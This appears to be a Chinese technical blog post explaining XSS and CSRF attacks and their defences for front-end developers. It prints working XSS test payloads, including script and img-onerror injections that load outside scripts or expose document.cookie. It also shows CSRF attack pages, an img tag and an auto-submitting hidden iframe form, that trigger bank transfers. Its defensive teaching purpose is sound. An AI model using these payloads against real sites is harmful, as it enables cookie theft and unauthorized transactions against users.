---
title: Web 安全之 XSS 和 CSRF
date: 2017-12-15 06:35:38
thumbnailImage: http://7xvi3w.com1.z0.glb.clouddn.com/xss0.png
thumbnailImagePosition: left
tags: 
- xss
- csrf
comments: false
metaAlignment: center
categories: 技术博文 
---
伴随着前端技术的不断发展，`Web` 应用已经随处可见了。随之而来的问题就是，谁来保护用户的隐私和网络安全？
<!-- more -->
#### 一、网络安全
{% alert info %}
[网络安全](https://baike.baidu.com/item/网络安全/343664?fr=aladdin)是指网络系统的硬件、软件及其系统中的数据受到保护，不因偶然的或者恶意的原因而遭受到破坏、更改、泄露，系统连续可靠正常地运行，网络服务不中断。
{% endalert %}

网络安全主要有如下特征：
- 保密性：信息不泄露给非授权用户、实体或过程，或供其利用的特性。
- 完整性：数据未经授权不能进行改变的特性。即信息在存储或传输过程中保持不被修改、不被破坏和丢失的特性。
- 可用性：可被授权实体访问并按需求使用的特性。即当需要时能否存取所需的信息。例如网络环境下拒绝服务、破坏网络和有关系统的正常运行等都属于对可用性的攻击；
- 可控性：对信息的传播及内容具有控制能力。
- 可审查性：出现安全问题时提供依据与手段。

通过上面，我们也了解到网络安全其实与我们息息相关，而作为 `Web` 前端开发工程师，这方面知识一定要了解，可能我们是距离用户最近的开发者。所以我们先从 `Web` 最常见的 `XSS` 和 `CSRF` 攻击来入手吧。
{% alert info %}
这个时代软件的特点就是：解决了用户痛点，就能为王！
{% endalert %}

#### 二、什么是 XSS ？
跨站脚本攻击（`Cross Site Scripting`，为了不和层叠样式表 `CSS` 混淆，故将跨站脚本攻击缩写为 `XSS`)。恶意攻击者往 `Web` 页面里插入恶意 `Script` 代码，当用户浏览该页之时，嵌入其中 `Web` 里面的 `Script` 代码会被执行，从而达到恶意攻击用户的目的。

`XSS` 主要有如下[三种分类](https://juejin.im/post/59e6b21bf265da43247f861d)：
- `Reflected XSS`（基于反射的 `XSS` 攻击）：主要通过利用系统反馈行为漏洞，并欺骗用户主动触发，从而发起 `Web` 攻击。
- `Stored XSS`（基于存储的 `XSS` 攻击）：`Stored XSS` 和 `Reflected XSS` 的差别就在于，具有攻击性的脚本被保存到了服务器并且可以被普通用户完整的从服务的取得并执行，从而获得了在网络上传播的能力。
- `DOM-based or local XSS`（基于 `DOM` 或本地的 `XSS` 攻击）：`DOM` 型 `XSS` 其实是一种特殊类型的反射型 `XSS`，它是基于 `DOM` 文档对象模型的一种漏洞。可以通过 `DOM` 来动态修改页面内容，从客户端获取 `DOM` 中的数据并在本地执行。基于这个特性，就可以利用 `JS` 脚本来实现 `XSS` 漏洞的利用。

`XSS` 是一门又热门又不太受重视的 `Web` 攻击方式，为什么会这样呢，原因如下：
- 耗时间；
- 有一定几率不成功；
- 没有相应的软件来完成自动化攻击；
- 前期需要基本的 `HTML`、`JS` 功底，后期需要扎实的 `HTML`、`JS`、`ActionScript2/3.0` 等语言的功底；
- 是一种被动的攻击手法；
- 对 `Website` 有 `http-only`、`crossdomian.xml` 没有用。

{% alert info %}
但是这些并没有影响黑客对此漏洞的偏爱，原因只有一个：`XSS`几乎每个网站都存在。
{% endalert %}

#### 三、XSS 情景再现
为了更好的说明 `XSS`，我们来举一些小栗子：
1.在网页 `input` 或者 `textarea` 中输入 `<script>alert('xss')</script>` ，如果弹出 `alert` 对话框，则说明网站存在 `XSS` 漏洞。
{% alert danger %}
请注意：我们经常在一些博客网站或者论坛底下的留言框看到 `alert`，你以为是用户热情，其实他们是想搞你！
{% endalert %}

2.只要网页存在 `XSS` 漏洞，攻击者可能会嵌入 `JS` 脚本，如：
```js
<script scr="jartto_xss_js"></script> // 获取 cookie ，发送用户信息等
```

3.图片也可能会被利用，如：
```js
<img src="..." onerror="appendChild(createElement('script')).src='jartto_xss_js'" />
```

4.直接使用 `URL` 参数攻击，如：
```
https://www.baidu.com?jarttoTest=<script>alert(document.cookie)</script>
```
当然，这里需要注意的是，`URL` 也有可能是不知来历的二维码，所以请慎重扫码。

{% alert success %}
到这里你可能就了解了，`XSS` 的目的就是在目标页面执行不为人知的 JS 脚本，从而窥探用户隐私甚至财产。
{% endalert %}

#### 四、XSS 漏洞检测以及防御
通常有一些方式可以测试网站是否有正确处理特殊字符，具体如下：
```js
><script>alert(document.cookie)</script> 
='><script>alert(document.cookie)</script> 
"><script>alert(document.cookie)</script> 
<script>alert(document.cookie)</script> 
<script>alert(vulnerable)</script> 
%3Cscript%3Ealert('XSS')%3C/script%3E  
<script>alert('XSS')</script> 
<img src="javascript:alert('XSS')"> 
<img src="http://jartto.com/test.png" onerror="alert('XSS')"> 
<div style="height:expression(alert('XSS'),1)" />（这个仅限 IE 有效） 
```
[防御手段](https://mp.weixin.qq.com/s/bCVUhh1hyj5KftoYfi89aA)可以采取如下方式：
- 对所有用户提交内容进行可靠的输入验证，包括对 `URL`、查询关键字、`HTTP`头、`POST`数据等，仅接受指定长度范围内、采用适当格式、采用所预期的字符的内容提交，对其他的一律过滤。
- 使用 `HTTP` 头指定类型，很多时候可以使用 `HTTP` 头指定内容的类型，使得输出的内容避免被作为 `HTML` 解析。
- 实现 `Session` 标记(session tokens)、`CAPTCHA` 系统或者 `HTTP` 引用头检查，以防功能被第三方网站所执行。
- 确认接收的的内容被妥善的规范化，仅包含最小的、安全的 `Tag` (没有 `JS` )，去掉任何对远程内容的引用(尤其是样式表和 `JS` )，使用 `HTTP only` 的 `Cookie`。

{% alert success %}
避免 `XSS` 的方法之一主要是将用户所提供的内容进行过滤，许多语言都有提供对 `HTML` 的过滤，看似很简单，实则很有效。
{% endalert %}

#### 五、什么是 CSRF ？
[跨站请求伪造](https://juejin.im/post/59e6b21bf265da43247f861d) `CSRF`（Cross-site request forgery），也被称为 `One Click Attack` 或者 `Session Riding`，通常缩写为 `CSRF` 或者 `XSRF`，是一种对网站的恶意利用。尽管听起来像跨站脚本 `XSS`，但它与 `XSS` 非常不同，`XSS` 利用站点内的信任用户，而 `CSRF` 则通过伪装来自受信任用户的请求来利用受信任的网站。

{% alert info %}
与 `XSS` 攻击相比，`CSRF` 攻击往往不大流行（因此对其进行防范的资源也相当稀少）和难以防范，所以被认为比 `XSS`更具危险性。
{% endalert %}

要完成一次 `CSRF` 攻击，受害者必须依次完成两个步骤：
1. 登录受信任网站 `A`，并在本地生成 `Cookie`。
2. 在不登出 `A` 的情况下，访问危险网站 `B`。

那么这里有个问题：如果我不满足以上两个条件中的一个，我就不会受到 `CSRF` 的攻击”。是的，确实如此，但你不能保证以下情况不会发生：
- 你不能保证你登录了一个网站后，不再打开一个 `tab` 页面并访问另外的网站。
- 你不能保证你关闭浏览器了后，你本地的 `Cookie` 立刻过期，你上次的会话已经结束。
- 攻击网站，可能是一个存在其他漏洞的可信任的经常被人访问的网站。

#### 六、CSRF 情景再现
为了阐述 `CSRF` 的操作流程，我们来举几个不太恰当，但足够说明问题的[栗子](https://juejin.im/post/59e6b21bf265da43247f861d)：

示例一：银行网站 `A`，它以 `GET` 请求来完成银行转账的操作，如：
```
http://www.mybank.com/Transfer.php?toBankId=11&money=1000
```
危险网站 `B`，它里面有一段 `HTML` 的代码如下：
```html
<img src=http://www.mybank.com/Transfer.php?toBankId=11&money=1000>
```
首先，你登录了银行网站 A ，然后访问危险网站 B ，噢，这时你会发现你的银行账户少了 1000 块...

究竟发生了什么，1000 块去哪里了？
- 银行网站 `A` 违反了 `HTTP` 规范，使用 `GET` 请求更新资源。
- 在访问危险网站 `B` 的之前，你已经登录了银行网站 `A`，而 `B` 中的以 `GET` 的方式请求第三方资源（这里的第三方就是指银行网站了，原本这是一个合法的请求，但这里被不法分子利用了）。
- 此时你的浏览器会带上你的银行网站 `A` 的 `Cookie` 发出 `Get` 请求，去获取资源。
- 银行网站服务器收到请求后，认为这是一个更新资源操作（转账操作），所以就立刻进行转账操作。

示例二：为了杜绝上面的问题，银行决定改用 `POST` 请求完成转账操作。银行网站 `A` 的 `WEB` 表单如下：
```html
<form action="Transfer.php" method="POST">
    <p>ToBankId: <input type="text" name="toBankId"/></p>
    <p>Money: <input type="text" name="money"/></p>
    <p><input type="submit" value="Transfer"/></p>
</form>
```
后台处理页面 `Transfer.php` 如下：
```php
<?php
　　　　session_start();
　　　　if (isset($_REQUEST['toBankId'] &&　isset($_REQUEST['money']))
　　　　{
　　　　    buy_stocks($_REQUEST['toBankId'],　$_REQUEST['money']);
　　　　}
?>
```
危险网站 `B` ，仍然只是包含那句 `HTML` 代码：
```html
<img src=http://www.mybank.com/Transfer.php?toBankId=11&money=1000>
```
和示例一中的操作一样，你首先登录了银行网站 `A`，然后访问危险网站 `B`，结果和示例一一样，你再次没了 1000块😱。

我们来捋一捋，1000 块又是怎么丢的？
- 银行后台使用了 `$_REQUEST` 去获取请求的数据，而 `$_REQUEST` 既可以获取 `GET` 请求的数据，也可以获取 `POST` 请求的数据，这就造成了在后台处理程序无法区分这到底是 `GET` 请求的数据还是 `POST` 请求的数据。

{% alert info %}
在 `PHP` 中，可以使用 `$_GET` 和 `$_POST` 分别获取 `GET` 请求和 `POST` 请求的数据。
{% endalert %}

示例三：经过前面两个惨痛的教训，银行决定把获取请求数据的方法也改了，改用 `$_POST`，只获取 `POST` 请求的数据，后台处理页面 `Transfer.php` 代码如下：
```php
<?php
　session_start();
　if (isset($_POST['toBankId'] &&　isset($_POST['money']))
　{
　　buy_stocks($_POST['toBankId'],　$_POST['money']);
　}
?>
```
然而，危险网站 `B` 与时俱进，它改了一下代码：
```html
<html>
  <head>
    <script type="text/javascript">
      function steal() {
        iframe = document.frames["steal"];
        iframe.document.Submit("transfer");
      }
    </script>
  </head>
  <body onload="steal()">
    <iframe name="steal" display="none">
      <form action="http://www.myBank.com/Transfer.php" method="POST">
        <input type="hidden" name="toBankId" value="11"></input>
        <input type="hidden" name="money" value="1000"></input>
      </form>
    </iframe>
  </body>
</html>
```
如果用户仍是继续上面的操作，很不幸，结果将会是再次不见 1000 块，因为这里危险网站 `B` 暗地里发送了 `POST` 请求到银行!

在损失 3000 块之后，我们意识到了 `CSRF` 攻击的严重性，来总结一下：
`CSRF` 主要的攻击模式基本上是以上的 3 种，其中以第 1, 2 种最为严重，因为触发条件很简单，一个就可以了，而第3种比较麻烦，需要使用 `JS`，所以使用的机会会比前面的少很多，但无论是哪种情况，只要触发了 `CSRF` 攻击，后果都有可能很严重。

{% alert info %}
`CSRF` 攻击是源于 `WEB` 的隐式身份验证机制，而 `WEB` 的身份验证机制虽然可以保证一个请求是来自于某个用户的浏览器，但却无法保证该请求是用户批准发送的！
{% endalert %}

此处示例出自[Web 安全的三个攻防姿势](https://juejin.im/post/59e6b21bf265da43247f861d)，查看详情请移步。还有一个有意思的[栗子](https://www.ibm.com/developerworks/cn/web/1102_niugang_csrf/)，出自 `developerWorks`。

#### 七、CSRF 漏洞如何防御？
1.验证 `HTTP Referer` 字段，利用 `HTTP` 头中的 `Referer` 判断请求来源是否合法。
- 优点：简单易行，只需要在最后给所有安全敏感的请求统一增加一个拦截器来检查 `Referer` 的值就可以。特别是对于当前现有的系统，不需要改变当前系统的任何已有代码和逻辑，没有风险，非常便捷。
- 缺点：
  - `Referer` 的值是由浏览器提供的，不可全信，低版本浏览器下 `Referer` 存在伪造风险。
  - 用户自己可以设置浏览器使其在发送请求时不再提供 `Referer` 时，网站将拒绝合法用户的访问。

2.在请求地址中添加 `token` 并验证，在请求中放入黑客所不能伪造的信息，并且该信息不存在于 `cookie` 之中，以`HTTP` 请求参数的形式加入一个随机产生的 `token` 交由服务端验证。
- 优点：比检查 `Referer` 要安全一些，并且不涉及用户隐私。
- 缺点：对所有请求都添加 `token` 比较困难，难以保证 `token` 本身的安全，依然会被利用获取到 `token`。

3.在 `HTTP` 头中自定义属性并验证 `One-Time Tokens`，将 `token` 放到 `HTTP` 头中自定义的属性里。通过  `XMLHttpRequest` 的异步请求交由后端校验，并且一次有效。
- 优点：统一管理 `token` 输入输出，可以保证 `token` 的安全性。
- 缺点：有局限性，无法在非异步的请求上实施。

虽然上面的这些方案可以很大程度上抵御 `CSRF` 的攻击，但并没有一种完美的解决方案。由于这些新的方案尚不成熟，要正式投入使用并被业界广为接受还需时日。
{% alert info %}
在这之前，我们只有充分重视 `CSRF`，根据系统的实际情况选择最合适的策略，这样才能把 `CSRF` 的危害降到最低。
{% endalert %}

#### 八、总结
随着 `Web2.0`、社交网络、微博等等一系列新型的互联网产品的诞生，基于 `Web` 环境的互联网应用越来越广泛，企业信息化的过程中各种应用都架设在 `Web` 平台上，`Web` 业务的迅速发展也引起黑客们的强烈关注，接踵而至的就是 `Web` 安全威胁的凸显。

在时代赋予 `Web` 前端开发使命的时候，我们应该比其他人更谨慎，更懂得应付危害网络安全的行为，任重而道远啊～


#### 九、参考
[Web 安全的三个攻防姿势](https://juejin.im/post/59e6b21bf265da43247f861d)
[XSS 的原理分析与解剖](http://netsecurity.51cto.com/art/201408/448305_all.htm)
[对于 XSS 和 CSRF 你究竟了解多少](http://netsecurity.51cto.com/art/201407/446775.htm)
[CSRF 攻击的应对之道](https://www.ibm.com/developerworks/cn/web/1102_niugang_csrf/)